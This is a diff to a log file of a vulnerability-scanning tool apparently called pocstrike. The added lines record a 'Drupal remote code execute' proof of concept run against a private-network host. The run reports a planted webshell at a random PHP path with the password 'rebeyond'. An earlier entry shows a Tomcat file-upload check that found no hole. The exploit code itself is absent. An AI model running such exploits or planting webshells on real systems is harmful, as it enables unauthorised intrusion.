@@ -130,3 +130,11 @@ KeyError: 'allow'
 [16:02:36] [INFO] running poc:'Tomcat arbitrary file upload' target 'http://192.168.2.245'
 [16:02:36] [-] {http://192.168.2.245} server not vulnerable
 [16:02:36] [INFO] Scan completed,ready to print
+[19:20:50] [INFO] loading PoC script 'C:\Users\cr0ss4ire\Desktop\spug-1.2.0\spug_api\libs\pocstrike\pocs\_2_drupal_rce.py'
+[19:20:50] [INFO] PoC script "Drupal remote code execute" requires "beautifulsoup4==4.9.3:bs4" to be installed
+[19:20:50] [INFO] pocstrike got a total of 1 tasks
+[19:20:50] [INFO] running poc:'Drupal remote code execute' target 'http://192.168.1.4/'
+[19:20:50] [+] target : http://192.168.1.4
+[19:20:50] [+] webshell : http://192.168.1.4/hqbBWPHFIi.php
+[19:20:50] [+] pass : rebeyond
+[19:20:50] [INFO] Scan completed,ready to print
